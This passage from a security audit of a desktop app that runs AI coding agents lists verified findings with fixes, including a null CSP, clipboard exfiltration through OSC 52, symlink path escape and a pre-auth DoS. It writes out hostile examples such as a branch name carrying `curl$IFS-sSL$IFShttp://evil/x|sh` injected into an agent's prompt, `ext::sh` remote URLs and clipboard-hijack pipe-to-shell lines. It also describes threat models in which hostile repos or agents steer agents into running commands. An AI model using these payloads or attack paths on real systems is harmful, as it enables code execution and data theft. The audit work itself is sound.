**How it breaks.** pnpm blocks dependency build/postinstall scripts by default; pnpm-workspace.yaml:6-10 turns that default off for four packages: `allowBuilds: {'@parcel/watcher': true, esbuild: true, lmdb: true, msgpackr-extract: true}`. pnpm-lock.yaml:1037-1110 and 1371+ show all three families entering only through @angular/build's graph. release.yml:110 runs `pnpm install --frozen-lockfile` in the build job, so those install scripts execute on the runner; the immediately following step (release.yml:111-115) sets TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD and runs `pnpm tauri build`, which in turn runs tauri.conf.json:9's `beforeBuildCommand: "pnpm build && node scripts/stage-updater-stub.mjs"` — the whole Angular toolchain, in-process, in the signing job. A postinstall that drops a shim on PATH or patches a node_modules entrypoint reads the secret out of the next step's environment. `--frozen-lockfile` pins versions by integrity hash, which is what bounds this to medium — but dependency-cves-11 shows there is no minimum-release-age quarantine at the moment a bump writes new versions into that lockfile, so the two findings compose.

  ```
  pnpm-workspace.yaml:6  allowBuilds:
  pnpm-workspace.yaml:7    '@parcel/watcher': true
  pnpm-workspace.yaml:8    esbuild: true
  pnpm-workspace.yaml:9    lmdb: true
  pnpm-workspace.yaml:10    msgpackr-extract: true
  release.yml:110       - run: pnpm install --frozen-lockfile
  release.yml:111       - name: Build Tauri app with signed updater artifacts
  release.yml:113           TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
  src-tauri/tauri.conf.json:9    "beforeBuildCommand": "pnpm build && node scripts/stage-updater-stub.mjs",
  ```

**Fix.** Split the release into an unprivileged build job and a minimal signing job: build the frontend and the Rust binary with no secrets in scope, upload the unsigned bundle, and sign it in a separate job that runs `pnpm install --ignore-scripts` (or no npm install at all) and no third-party actions, gated behind a GitHub Environment with required reviewers. If the split is not taken now, at minimum add `--ignore-scripts` to the release job's install and verify the Tauri build still succeeds — the four allowBuilds entries exist for local dev ergonomics, not for a CI build that only needs `ng build`.

### 11. No Content-Security-Policy on the app webview (csp: null), so any sanitizer bypass is unconstrained RCE

`src-tauri/tauri.conf.json:24` — csp-xss

**Actor.** T1/T2 (agent- or repo-authored content rendered in the webview); T5 (compromised npm dep in the bundle) · **Precondition.** Any one script-injection primitive in the webview: a DOMPurify bypass in the mermaid path (see -03), an Angular sanitizer mXSS gap, or a malicious/compromised frontend dependency. The app renders fully attacker-controlled markdown from a hostile repo by default.

**Impact.** With no CSP there is no script-src, no connect-src, no frame-src and no object-src backstop. Injected script inherits the app origin and can call every registered Tauri command, including core::commands::open_path, which takes an arbitrary absolute path with no scope check and hands it to the OS default handler (i.e. executes it): that is arbitrary code execution as the user. It can also silently exfiltrate anything it reads (agent transcripts, worktree files, settings) to any host, since connect-src is unrestricted.

**How it breaks.** A malicious repo (T2) or agent (T1) writes a .md file into the worktree; the user opens it in the file view, which defaults to rendered preview (src/app/workspace/file-view.component.ts:162). The markdown goes through marked and Angular's sanitizer, then the mermaid post-pass re-injects mermaid's output with raw innerHTML. Angular's sanitizer and mermaid's DOMPurify are the ONLY two barriers, and the mermaid path removes one of them. If either is bypassed, nothing else stops the script: no CSP is emitted for the custom protocol because security.csp is null, so the injected code runs with full access to window.__TAURI_INTERNALS__ and invokes open_path('/path/to/payload.command') or settings_set to repoint an agent binary. There is no written rationale for csp: null anywhere in the repo (grep for csp across src-tauri and docs returns only this line).

  ```
  src-tauri/tauri.conf.json
  23:    "security": {
  24:      "csp": null
  25:    }
  
  src-tauri/src/core/commands.rs
  32: pub fn open_path(app: tauri::AppHandle, path: String) -> Result<(), String> {
  34:     .open_path(path, None::<&str>)
  
  src-tauri/src/lib.rs:368  core::commands::open_path,
  ```

**Fix.** Set an explicit restrictive csp in tauri.conf.json (script-src 'self' plus a hash/nonce for the index.html theme script, object-src 'none', frame-src 'none', connect-src limited to the changelog host, img-src 'self' data:, style-src 'self' 'unsafe-inline'), and scope or remove the unscoped open_path command.

<sub>Verifier: Verified line for line. src-tauri/tauri.conf.json:23-25 is exactly `"security": { "csp": null }`. The escalation claim holds and is understated: in Tauri v2 app-defined commands registered via generate_handler are NOT gated by capabilities/default.json (only plugin commands are), so any script running in the app origin reaches all 101 registered commands. I counted them with `awk '/invoke_handler/,/\]\)/' src-tauri/src/lib.rs | grep -c '::'` = 101, and they include core::commands::open_path (lib.rs:368, defined at src-tauri/src/core/commands.rs:32-36 with no scope check — `app.opener().open_path(path, None::<&str>)` on a caller-supplied absolute path), settings::commands::settings_set (lib.rs:356), agents::fs_commands::file_write / file_delete (lib.rs, fs_commands), search::commands::search_replace_apply, history::commands::history_restore. capabilities/default.json grants only plugin permissions (core:default, opener:default, dialog:allow-open, updater:default, process:allow-restart) and is therefore irrelevant to those app commands. The finder's claim that there is no written rationale for csp:null is correct — grep for csp across src-tauri and docs returns only tauri.conf.json:24 and the audit maps. Severity stays medium and not higher because no injection primitive is demonstrated in this pass: the two rendering barriers (Angular's sanitizer on the [innerHTML] markdown, mermaid's DOMPurify 3.4.13) are currently intact, so this is a missing backstop rather than a live hole. One correction to the fix text: a script-src 'self' policy would break the theme bootstrap at src/index.html:14-23, so that inline script needs a hash or must move into a real file.</sub>

### 12. xterm ClipboardAddon gives the agent OSC 52 read access to the user's system clipboard, and writes the result back into the agent's stdin

`src/app/terminal.service.ts:173` — information-disclosure _(added by verifier)_

**Actor.** T1 — a malicious or compromised agent process (or any program it runs, or a hostile file it cats) writing bytes to its own PTY · **Precondition.** An agent session is attached to a terminal (the normal state). The agent emits the escape sequence \x1b]52;c;?\x07 on stdout. No user interaction of any kind is required.

**Impact.** The contents of the user's system clipboard — routinely a password-manager copy, an SSH key, an API token, or a 2FA code — are handed to the agent process, which is confined to a worktree but has network access. The reverse direction is equally reachable: OSC 52 write silently replaces the user's clipboard, so a later paste into another terminal or a browser can be attacker-chosen text (classic clipboard-hijack to `curl … | sh`).

**How it breaks.** terminal.service.ts:173 loads `new ClipboardAddon()` with no arguments, so it uses the default BrowserClipboardProvider. In node_modules/@xterm/addon-clipboard/lib/addon-clipboard.mjs, `activate` registers `t.parser.registerOscHandler(52, r => this._setOrReportClipboard(r))`; `_setOrReportClipboard` branches on `if (i === "?")` and calls `this._provider.readText(o)` — which is `async readText(t) { return t !== "c" ? Promise.resolve("") : navigator.clipboard.readText() }` — then `_readText` does `this._terminal?.input(`\x1B]52;${t};${o}\x07`, false)`. `Terminal.input` fires the data event, and terminal.service.ts:225 wires `term.onData((data) => void this.agents.input(id, data)...)` straight to the PTY stdin. Agent output reaches `term.write` on the normal streaming path, so the loop closes with no keystroke. The in-code comment at :170-172 documents the feature ('lets programs running in the terminal … read/write the system clipboard') but not the exfiltration consequence, and OSC 52 *read* is disabled by default in most terminals and in VS Code for exactly this reason. Confidence is medium rather than high on one point only: whether navigator.clipboard.readText() resolves without a user gesture differs per webview backend (WKWebView and WebKitGTK generally gate it; WebView2's clipboard-read permission handling is the case most likely to succeed), and I could not execute the app here to settle it. The write direction is materially less gated and works today on Chromium-based webviews whenever the document is focused.

  ```
  src/app/terminal.service.ts\n170:      // OSC 52 clipboard: lets programs running in the terminal (agent CLIs, vim,\n171:      // tmux…) read/write the system clipboard via escape sequences. Complements\n172:      // the Ctrl/Cmd+Shift+C/V user copy/paste keybindings below.\n173:      term.loadAddon(new ClipboardAddon());\n225:      term.onData((data) => void this.agents.input(id, data).catch(() => {}));\n\nnode_modules/@xterm/addon-clipboard/lib/addon-clipboard.mjs\n  activate(t){this._terminal=t,this._disposable=t.parser.registerOscHandler(52,r=>this._setOrReportClipboard(r))}\n  _readText(t,r){let o=this._base64.encodeText(r);this._terminal?.input(`\\x1B]52;${t};${o}\\x07`,!1)}\n  _setOrReportClipboard(t){...if(i==="?"){let a=this._provider.readText(o);...}}\n  g = class{async readText(t){return t!=="c"?Promise.resolve(""):navigator.clipboard.readText()}...}
  ```

**Fix.** Pass an explicit provider to ClipboardAddon that implements writeText (optionally, and ideally behind a visible indicator) but makes readText a no-op returning "", e.g. `new ClipboardAddon(undefined, { readText: () => "", writeText: (sel, t) => navigator.clipboard.writeText(t) })`. That keeps the useful direction (tmux/vim yanking into the clipboard) and closes the read channel, matching VS Code's posture. If clipboard write should also be gated, make it a per-agent setting that defaults off.

### 13. Anchors in markdown previews navigate the whole chromeless webview — no click interception and no on_navigation guard

`src/app/workspace/file-view.component.ts:101` — csp-xss _(downgraded on verification)_

**Actor.** T1 (agent writes the file) / T2 (hostile repo ships the README) · **Precondition.** The user clicks a link inside a rendered markdown file (default view for .md) or inside a ticket note / comment. No XSS is required — Angular's sanitizer deliberately preserves <a href>.

**Impact.** The top-level webview navigates away from the app to attacker-controlled content. The window is created with decorations: false (src-tauri/tauri.conf.json:20), so there is no title bar, address bar, back button or reload affordance: the attacker page occupies the entire app frame and the user has no in-app way back. That makes a convincing phishing surface (a fake 'Orrery — re-authenticate with GitHub' page inside what still looks like the app window) and a denial of the app until it is force-quit and restarted.

**How it breaks.** A hostile repo's README.md or an agent-written .md renders through marked at file-view.component.ts:196 into [innerHTML] at :101; Angular's sanitizer keeps <a href> for every scheme except javascript:. styles.css:1406-1411 styles it as a clickable link. Clicking navigates the single, undecorated top-level webview to the attacker's page; with the app's own titlebar gone there is no back/reload/close affordance short of force-quitting. The ticket-note path in the original write-up is not attacker-reachable: notes and comments only enter via tickets::commands::comment_add/ticket_update from the app UI (src/app/stores/tickets.store.ts:75), never from an agent or repo.

  ```
  src/app/workspace/file-view.component.ts
  101:      <div class="scroll-y rte-view md-body" ... [innerHTML]="mdHtml()"></div>
  196:  readonly mdHtml = computed(() => (this.content() ? (marked.parse(this.content()!) as string) : ""));
  
  src/app/shared/rich-editor/rich-view.component.ts
  25:  template: `<div class="rte-view" [class.compact]="compact()" [innerHTML]="html()"></div>`,
  
  src/styles.css
  1406: :is(.rte-content, .rte-view) :is(a, .rte-link) { ... cursor: pointer; }
  ```

**Fix.** Add a capture-phase click handler on the markdown/rich-text containers (or a document-level one) that calls preventDefault on any <a href> and routes http/https through plugin-opener's openUrl while dropping every other scheme, and add a Rust-side on_navigation guard that rejects any navigation off the app origin.

<sub>Verifier: Half confirmed, half refuted. CONFIRMED for the markdown channel: file-view.component.ts:101 binds [innerHTML]="mdHtml()", mdHtml at :196 is `marked.parse(this.content()!)` with no options and no post-filter, preview() defaults to true at :162, so a .md file written by an agent (T1) or shipped by a hostile repo (T2) renders its anchors by default; `grep -rn 'closest(\"a\")|a\[href\]' src/app` returns nothing, so there is no click interception, and `grep -rn 'on_navigation|on_page_load' src-tauri/src` returns nothing, so there is no Rust-side navigation guard. REFUTED for the ticket-notes/comment channel the finder attached to this: ticket notes and comments are written only through the Tauri commands tickets::commands::ticket_create / ticket_update / comment_add (src-tauri/src/lib.rs:280,285) into the app's SQLite store, called only from src/app/stores/tickets.store.ts:75 — no hook, CLI or agent path writes them (grep for TicketService outside src-tauri/src/tickets returns only lib.rs wiring, runtime/mod.rs:440 shutdown and agents/commands.rs:30). Content there is the user's own, so it is self-XSS at worst, not a T1/T2 channel. Impact is also narrower than stated: capabilities/default.json declares no `remote` context, so a navigated-to remote origin should not reach the plugin IPC (I could not verify from the vendored tauri source, which is not present here, whether the IPC bootstrap script is injected into remote pages — if it is, app-defined commands are not ACL-gated and this becomes critical; that is worth a 5-minute check on a real build). What is solid is the chromeless-phishing / app-lockout impact, since decorations:false (tauri.conf.json:20) means the window chrome is drawn by the Angular app and disappears with it. Keeping medium: realistic precondition (clicking a README link), bounded impact.</sub>

### 14. safe_join is lexical only - a repo-checked-out FILE symlink makes file_write / file_read_binary act on a target outside the worktree

`src-tauri/src/agents/fs_commands.rs:17-33` — path-traversal

**Actor.** T2 (hostile repository; the symlink is a normal git object, checked out by create_worktree) · **Precondition.** The repo contains a symlink such as `config -> /home/<user>/.ssh` or `notes.txt -> /home/<user>/.bashrc`; the user then edits/creates/renames/previews a path under it in the app's file tree.

**Impact.** File writes, creates, renames, deletes and binary reads land on files outside the worktree: `file_write` truncates and overwrites `~/.ssh/authorized_keys`-style targets, and `file_read_binary` base64s an arbitrary file back to the UI. The module's stated contract ("`safe_join` rejects absolute paths, drive prefixes, and `..` so a command can never escape the agent's worktree", fs_commands.rs:2-4) does not hold.

**How it breaks.** A symlinked file checked out by create_worktree appears as an ordinary file in the tree (fs/mod.rs:70 uses the non-following DirEntry::file_type, so symlinked directories are never recursed and only the file case is reachable from the UI). Opening it calls read_binary/file read -> std::fs::read follows the link; saving calls write_file -> std::fs::write truncates the link target outside the worktree. safe_join only inspects string components and resolves nothing on disk.

  ```
  src-tauri/src/agents/fs_commands.rs
  22:    let p = Path::new(rel);
  23:    if p.is_absolute() { return Err(...); }
  26:    for c in p.components() {
  27:        match c { Component::Normal(_) | Component::CurDir => {}
  29:            _ => return Err(AppError::Other(format!("unsafe path component in '{rel}'"))), } }
  32:    Ok(workdir.join(p))
  ```

**Fix.** Canonicalize the joined path (or walk it component-by-component with `symlink_metadata`) and require the result to stay under the canonicalized worktree root before any read/write/rename/open; refuse paths whose parents contain symlinks.

<sub>Verifier: `safe_join` (agents/fs_commands.rs:17-32) is confirmed lexical-only and every consumer follows symlinks: `write_file` -> `std::fs::write` (fs_commands.rs:45), `read_binary` -> `std::fs::metadata` + `std::fs::read` (fs_commands.rs:131-141), `os_target` -> `abs.exists()` (fs_commands.rs:247). `create_worktree` materializes repo symlinks through `gix_worktree_state::checkout` (gix_backend.rs:310-330). One correction to the mechanism: the DIRECTORY-symlink variant is not reachable from the UI, because `fs::scan` derives `is_dir` from `entry.file_type()` (src-tauri/src/fs/mod.rs:70), which on Unix comes from readdir/lstat and is false for a symlink, so the tree never descends into a symlinked directory and never hands the frontend a path whose prefix is a link. The reachable case is a FILE symlink (`notes.txt -> ~/.bashrc`): it renders as an ordinary file, opening it reads through the link and saving it truncates and rewrites the outside target. `delete_path` is not a vector (remove_dir_all does not traverse a symlink), and `search::apply_replace` (search/mod.rs:241-250) is saved by the walker's `follow_links(false)` (search/mod.rs:358), as the finder said. Medium is right: the escape is real and the module's stated contract (fs_commands.rs:2-4) is false, but it needs a hostile repo plus a user edit.</sub>

### 15. Base branch name is interpolated unsanitized into a shell command the app types into the agent's PTY

`src-tauri/src/agents/prompts.rs:16-25` — injection

**Actor.** T2 (hostile repository / hostile remote: git ref names legally contain `;`, `|`, `$`, `&`, backticks) · **Precondition.** The user spawns an agent with the hostile branch as base — the spawn modal preselects the repo's default branch, which after `git clone` is whatever the remote's HEAD names — and then triggers the Rebase or Merge completion action.

**Impact.** The agent is instructed to run `git rebase main;curl$IFS-sSL$IFShttp://evil/x|sh`, i.e. attacker-chosen shell commands executed as the user, subject only to the agent's own permission prompt (which the app's best-effort keystroke allow/deny may auto-answer).

**How it breaks.** `branch` is sanitized on the way in (`sanitize_branch`, agents/service.rs:823-843, which strips everything outside `[A-Za-z0-9._/-]`), but `base` is stored raw from the spawn request (`base: req.base`, agents/service.rs:230) and interpolated straight into the prompt text. `agent_action` reads it back from the DB and types it into the running PTY (`action_prompt(&kind, &agent.branch, &agent.base)`, agents/commands.rs:275). `base` is the branch the user picked in the spawn modal, whose options are the repository's own branch list (`<app-select [value]="branch()" [options]="proj.branches ?? []">`, src/app/modals/spawn-modal.component.ts:137) with the repo's default branch preselected (spawn-modal.component.ts:397-399).

  ```
  src-tauri/src/agents/prompts.rs
  16:        "rebase" => format!(
  17:            "Rebase this worktree onto `{base}`: run `git rebase {base}`, resolve any \
  18:             conflicts, and complete the rebase. Do not push and do not merge."
  19:        ),
  20:        "merge" => format!(
  22:             into this branch. From within this worktree run `git merge {base}`, ...
  ```

**Fix.** Run `base` through `sanitize_branch` (or reject anything outside `[A-Za-z0-9._/-]`) before persisting it at agents/service.rs:230, and quote it in the prompt.

<sub>Verifier: Verified: `branch` is sanitized (`branch_from_template` -> `sanitize_branch`, agents/service.rs:803-816 and 823-846, which also strips a leading `-` per component so the push argv is safe), while `base` is persisted raw at agents/service.rs:230 (`base: req.base`) and interpolated unquoted into the rebase/merge prompt (agents/prompts.rs:16-26), which `agent_action` types into the live PTY (agents/commands.rs:275-278). The inconsistency between the two fields is the defect. Impact is weaker than stated and stays medium, not high: the hostile base must be a legal refname (no spaces), it is rendered verbatim in the spawn modal's branch dropdown (src/app/modals/spawn-modal.component.ts:137) so a user who looks will see it, and execution still depends on the agent electing to run the command through its own permission gate - the keystroke allow/deny is a documented best-effort trade-off, not a guarantee of auto-approval. Confirmed at medium as an unsanitized-input inconsistency with a plausible but multi-step path to execution.</sub>

### 16. System-git fetch/pull/push execute code defined by the repository's own .git/config (ext:: remote URLs, hooks, core.fsmonitor)

`src-tauri/src/git/backend.rs:209-217` — injection _(downgraded on verification)_

**Actor.** T2 (a repository the user adds as a project with its `.git` directory intact — archive download, shared/synced folder, copied checkout) · **Precondition.** The user adds such a directory as a project and clicks Fetch / Pull / Push in the Branches panel.

**Impact.** Arbitrary command execution as the user. `[remote "origin"] url = ext::sh -c 'curl … | sh'` runs on the plain `git fetch --all --prune` button; `core.fsmonitor`, `core.sshCommand`, `core.pager`, and `.git/hooks/*` (pre-push, post-merge) give the same result on push/pull.

**How it breaks.** Only clone/push/fetch/pull shell out to system git (the documented credential-helper trade-off), but the shell-out inherits the repository as a trust boundary: `cmd.current_dir(repo_path).args(["fetch", "--all", "--prune"])` runs git inside a directory whose `.git/config` the attacker wrote. The UI wires this to two one-click buttons — a per-remote Fetch (`(click)="store.fetch(p.id, r.name)"`, src/app/tool-window/branches-panel.component.ts:70) and a fetch-all (line 89) — and to Pull (line 92) which runs `git pull --ff-only` (backend.rs:221-225). Everything else the app does with the repo goes through gitoxide, which does not execute hooks or transports, so "adding a project" reads as an inert operation to the user; nothing warns that a git button will execute repo-supplied commands. Note this vector needs the `.git` dir itself: a `git clone` of a hostile URL does not import the remote's config, so the exposure is directories the user adds, not URLs they clone.

  ```
  src-tauri/src/git/backend.rs
  209:    fn fetch(&self, repo_path: &Path, remote: Option<&str>) -> AppResult<()> {
  210:        let mut cmd = crate::core::proc::cmd("git");
  211:        cmd.current_dir(repo_path);
  212:        match remote {
  213:            Some(r) => cmd.args(["fetch", "--prune", r]),
  214:            None => cmd.args(["fetch", "--all", "--prune"]),
  216:        run_git(cmd, "fetch")
  ```

**Fix.** Run the network git ops with hostile-config defences: pass `-c core.fsmonitor= -c core.hooksPath=/dev/null -c protocol.ext.allow=never -c protocol.allow=user` (and `--no-verify` on push), and surface a one-time warning the first time a project directory that was added (not cloned) has a non-empty `.git/hooks` or a non-standard transport URL.

<sub>Verifier: The code is as quoted (backend.rs:209-217 fetch, 202-207 push, 221-225 pull_ff, all `current_dir(repo)` + system git) and the one-click wiring is confirmed (src/app/tool-window/branches-panel.component.ts:70 per-remote Fetch, :89 fetch-all, :92 Pull). But the precondition is narrower than high implies: it needs a repository directory delivered WITH its `.git` (the finder concedes clone does not import remote config), i.e. an unzipped working copy, a synced/shared folder, or a colleague's checkout - not the normal add-a-local-repo or clone-a-URL flow. It is also the generic git trust model rather than a boundary this app claims to enforce: any git GUI, or a terminal `git fetch` in that directory, does the same, and the user's next action in that project (spawning an agent) executes repo-supplied code by design. Per the rubric ('requires an unlikely precondition') this is medium. The hardening flags are still cheap and worth adding; the higher-severity sibling with a realistic precondition is the unvalidated clone URL (fs-git-worktree-missed-01).</sub>

### 17. "Merge in" force-resets the worktree: uncommitted changes to tracked files are silently overwritten, with none of git's dirty-tree refusal

`src-tauri/src/git/gix_backend.rs:1627` — data-loss _(added by verifier)_

**Actor.** no adversary needed (plain user action) · **Precondition.** The user picks "Merge" from an agent's context menu (or the git-tab merge action) while the agent's worktree has uncommitted modifications to tracked files.

**Impact.** Every uncommitted modification to a tracked file in the agent's worktree is discarded and rewritten from the merge result, with no confirmation, no dirty-tree check, and no error - the opposite of `git merge`, which aborts with "Your local changes would be overwritten". The work the agent has not committed yet is exactly what the worktree model exists to hold.

**How it breaks.** `merge` calls `reset_to_tree` on both paths - fast-forward (gix_backend.rs:1627) and true merge (gix_backend.rs:1666) - before there is any commit of the local state. `reset_to_tree` is documented as "git's force checkout / reset --hard" (gix_backend.rs:1153-1157) and its selection set is not limited to the HEAD->target diff: the loop at gix_backend.rs:1169-1177 walks `status_uncached` and inserts EVERY dirty path (`if ch.state != "A" || tree_has_file(...)`), which are then force-restored via `checkout_paths` with `opts.overwrite_existing = true` (gix_backend.rs:1097-1098). Nothing anywhere checks for a dirty worktree first: `agent_merge` goes straight to the backend (agents/commands.rs:835-848), and `mergeAgent` invokes it with no confirm dialog (src/app/agents/agent-actions.service.ts:129-151), reached from the plain context-menu item `case "merge":` (agent-actions.service.ts:76-83). `merge_abort` has the same shape (gix_backend.rs:1750-1760). Partial mitigation: the watcher's local-history snapshots may hold a recent copy (history/mod.rs), which is why this is medium rather than high - but the merge itself takes no guard snapshot the way `history::restore` does at history/mod.rs:241.

  ```
  src-tauri/src/git/gix_backend.rs
  1626:            // fast-forward: worktree first (dirty detection reads HEAD), then the ref
  1627:            reset_to_tree(&repo, tree_id_of(&repo, theirs)?)?;
  ...
  1666:        reset_to_tree(&repo, merged)?;
  
  1158: fn reset_to_tree(repo: &gix::Repository, target: gix::ObjectId) -> AppResult<()> {
  1169:     for ch in GixBackend::status_uncached(&workdir, false) {
  1170:         let p: BString = ch.path.into();
  1171:         if ch.state != "A" || tree_has_file(&target_tree, p.as_bstr()) {
  1172:             paths.insert(p);
  ```

**Fix.** Refuse the merge when the worktree is dirty (mirror git: list the paths that would be overwritten and return an error the UI shows), or take a local-history guard snapshot of every dirty path before `reset_to_tree`, as `history::restore` does for its own undo.

### 18. conflict_resolve / revert_hunk / commit / file_diff / file_hunks join frontend-supplied paths onto the worktree with no guard

`src-tauri/src/git/gix_backend.rs:1718-1725` — path-traversal

**Actor.** an attacker who can issue IPC calls — i.e. a compromised renderer (the webview renders agent output and repo/transcript content; see the frontend lens). Not reachable from the hook bridge, which only emits events. · **Precondition.** Any script running in the webview can invoke `agent_conflict_resolve`, `agent_hunk_revert` or `agent_commit` with an absolute or `..`-prefixed path.

**Impact.** Arbitrary file write with arbitrary content (`agent_conflict_resolve` creates parent directories and writes, e.g. `~/.bashrc`, `~/.claude/settings.json`, a git hook); arbitrary file truncation/rewrite via `agent_hunk_revert`; arbitrary file read into a commit object via `agent_commit` (an absolute path in `paths` is passed to the filter pipeline and staged).

**How it breaks.** `conflict_resolve` does `workdir.join(rel)` + `create_dir_all(parent)` + `std::fs::write` with `rel` coming straight from `agent_conflict_resolve(id, path, content)` (agents/commands.rs:871-882). `revert_hunk` likewise joins `rel` (gix_backend.rs:2349-2351) after computing hunks against an empty HEAD blob for an unknown path, so `old_n == 0` splices the file down. `commit` joins each requested pathspec (`let abs = workdir.join(p);` gix_backend.rs:1526) and pushes it through `pipeline.worktree_file_to_object` (line 1544). The sibling module `fs_commands` does guard the identical worktree-relative contract via `safe_join`, so this is an inconsistency, not a design choice.

  ```
  src-tauri/src/git/gix_backend.rs
  1718:    fn conflict_resolve(&self, repo_path: &Path, rel: &str, content: &str) -> AppResult<()> {
  1720:        let workdir = workdir_of(&repo)?;
  1721:        let abs = workdir.join(rel);
  1722:        if let Some(parent) = abs.parent() { let _ = std::fs::create_dir_all(parent); }
  1725:        std::fs::write(&abs, content)...
  ```

**Fix.** Route every worktree-relative path parameter (conflict_resolve, revert_hunk, file_hunks, commit/discard pathspecs, file_diff) through one shared, symlink-aware `safe_join` in the command layer rather than trusting the renderer.

<sub>Verifier: gix_backend.rs:1718-1725 confirmed verbatim: `let abs = workdir.join(rel); create_dir_all(parent); std::fs::write(&abs, content)` with `rel` arriving unchecked from `agent_conflict_resolve` (agents/commands.rs:869-884). `revert_hunk` joins the same way (gix_backend.rs:2349-2351) and `commit` joins each pathspec (gix_backend.rs:1526) before `pipeline.worktree_file_to_object` (gix_backend.rs:1544). Two more members of the same family, listed by the finder only in the fix and not the evidence, are also unguarded reads: `file_diff` - `std::fs::read_to_string(worktree.join(rel))` (gix_backend.rs:2315) - and `file_hunks` - `std::fs::read(worktree.join(rel))` (gix_backend.rs:2327). Severity stays medium and not higher because the only actor that can reach a Tauri command is the renderer, so this is a defence-in-depth inconsistency against the sibling `fs_commands` contract rather than an independently exploitable hole; the write primitive (arbitrary path, arbitrary content) is what keeps it above low.</sub>

### 19. "Non-destructive" global hook merge silently replaces the user's whole agent config when the file fails to parse or fails to read

`src-tauri/src/agents/adapters/codex.rs:104-125` — other

**Actor.** No attacker needed (any unparsable/unreadable config); T1 can force it by writing one bad byte into ~/.codex/config.toml or ~/.claude/settings.json · **Precondition.** ~/.codex/config.toml (or ~/.claude/settings.json, ~/.cursor/hooks.json, ~/.gemini/settings.json) exists but does not parse, or cannot be read (EACCES, locked by another process on Windows). install_global_hooks runs on EVERY app start (lib.rs:169-171).

**Impact.** The user's entire global agent configuration — codex model/provider settings, MCP server definitions, permission allowlists, and any credentials kept there — is silently overwritten with a file containing only Orrery's hook keys. No backup, no log, no atomic write. The app's stated contract ("merged non-destructively (preserving all other keys)", codex.rs:100-102, adapters/mod.rs:454-462) is violated exactly when the user's file is most fragile.

**How it breaks.** codex.rs:104-107 does read_to_string(...).ok().and_then(parse).ok().unwrap_or_default(): a read error OR a parse error both collapse to an EMPTY DocumentMut, and codex.rs:125 then fs::write()s that empty doc plus the five hook keys over the user's file. adapters/mod.rs:486-493 is the same pattern for the JSON adapters (read error / parse error / non-object -> empty Map) followed by fs::write at mod.rs:526. The JSON path additionally rewrites the file through serde_json::to_vec_pretty, discarding any formatting the user had. A T1 agent that wants the user's codex MCP/provider config gone only has to append a `[` to it and wait for the next app start.

  ```
  104:        let mut doc = std::fs::read_to_string(&path)
  105:            .ok()
  106:            .and_then(|s| s.parse::<DocumentMut>().ok())
  107:            .unwrap_or_default();      // read OR parse failure => EMPTY document
  …
  125:        std::fs::write(path, doc.to_string())   // user's whole config replaced
  ```

**Fix.** Distinguish "absent" from "unreadable/unparsable": on any read or parse error, log and skip the merge for that tool rather than writing; and write through a temp file + rename with a one-time .bak of the previous contents.

<sub>Verifier: Verified verbatim at codex.rs:104-107 (`read_to_string(&path).ok().and_then(|s| s.parse::<DocumentMut>().ok()).unwrap_or_default()`) followed by `std::fs::write(path, doc.to_string())` at codex.rs:125, and the same shape for the JSON adapters at adapters/mod.rs:486-493 (read error / parse error / non-object all collapse to an empty Map) followed by `std::fs::write(path, serde_json::to_vec_pretty(...))` at adapters/mod.rs:527. install_global_hooks (adapters/mod.rs:315-324) is called unconditionally at every app start (lib.rs:169-171). Two corrections to the actor/precondition: (1) the 'unreadable' branch is largely self-healing — if read_to_string fails with EACCES the subsequent fs::write fails too and the error is only logged (adapters/mod.rs:320-322), so the destructive path is specifically a file that READS fine but does not PARSE (a JSONC comment or trailing comma in ~/.claude/settings.json, a hand-edited typo in config.toml, a JSON root that is not an object); (2) the T1 'agent writes one bad byte' framing adds nothing — an agent that can append to ~/.codex/config.toml can truncate it directly. So this needs no attacker at all, which is what makes it worth reporting. Impact is also slightly broader than stated: ~/.claude/settings.json holds the user's own `permissions.deny`/`allow` rules, so silently replacing it with a hooks-only object removes guardrails the user believes are still in force. Medium is right — real, silent, unbounded-in-blast-radius data loss, but gated on a malformed file rather than on an attacker.</sub>

### 20. Bridge allocates a client-declared Content-Length buffer before authenticating, with no socket timeouts and unbounded thread-per-connection

`src-tauri/src/hooks/protocol.rs:704-720` — dos-resource

**Actor.** T3 (any other local process/user that can reach 127.0.0.1 on the machine — no token needed); also T1 · **Precondition.** The attacker can connect to the ephemeral loopback port (a ~65k-port scan, or reading it from the agent env). No knowledge of the bridge token is required.

**Impact.** Unauthenticated memory exhaustion and thread exhaustion of the desktop app: the app is OOM-killed or wedged, taking down every agent PTY it owns (stop_all on exit) and the UI.

**How it breaks.** read_request parses the client's Content-Length (protocol.rs:704) and does `vec![0u8; len]` (protocol.rs:719) with no upper bound, then blocks in read_exact. handle() only compares the token AFTER read_request returns (hooks/mod.rs:177-181), so this is pre-auth. The accepted stream never gets set_read_timeout/set_write_timeout (hooks/mod.rs:171-180), so a client that sends headers and then nothing pins the thread and the buffer forever; the acceptor spawns one unbounded OS thread per connection (hooks/mod.rs:119-138) with no connection cap. Attacker: open N connections, each declaring Content-Length: 2^40 and dribbling bytes to force commit, or simply hold them open to exhaust threads.

  ```
  704:                "content-length" => len = value.trim().parse().unwrap_or(0),
  719:    let mut buf = vec![0u8; len];
  720:    r.read_exact(&mut buf)?;
  --- hooks/mod.rs
  177:    let req = match read_request(&mut reader) {   // body read BEFORE the token check
  181:    if req.auth.as_deref() != Some(token) {
  ```

**Fix.** Cap Content-Length (a hook envelope is < 1 MiB) and reject larger with 413 before allocating, read the Authorization header and reject 401 before reading any body, set read/write timeouts on every accepted stream, and bound concurrent connection threads with a small pool.

<sub>Verifier: Verified pre-auth: handle() calls read_request (hooks/mod.rs:177) and only then compares the token (hooks/mod.rs:181), and read_request takes the client's Content-Length verbatim (protocol.rs:704 `"content-length" => len = value.trim().parse().unwrap_or(0),`) into `let mut buf = vec![0u8; len];` (protocol.rs:719) with no cap. No socket timeout exists anywhere in the server — the only set_read_timeout in the tree is on the CLIENT side (cli/hook.rs:129), confirmed by `grep -rn set_read_timeout src-tauri/src` returning one hit. The mechanism is sharper than described, so I am correcting howItBreaks rather than the verdict: `vec![0u8; len]` is an alloc_zeroed, so for a len the allocator cannot satisfy (e.g. Content-Length: 140737488355328) the allocation FAILS and Rust's handle_alloc_error ABORTS the whole process — a single unauthenticated connection kills the app and every PTY it owns, no dribbling needed. (src-tauri/Cargo.toml has no [profile] section, so panic=unwind: a `capacity overflow` panic from a len > isize::MAX would only kill the connection thread, which is why the interesting value is a large-but-representable one.) Also missing from the finding: the header parse itself is unbounded — protocol.rs:688 and 692 use 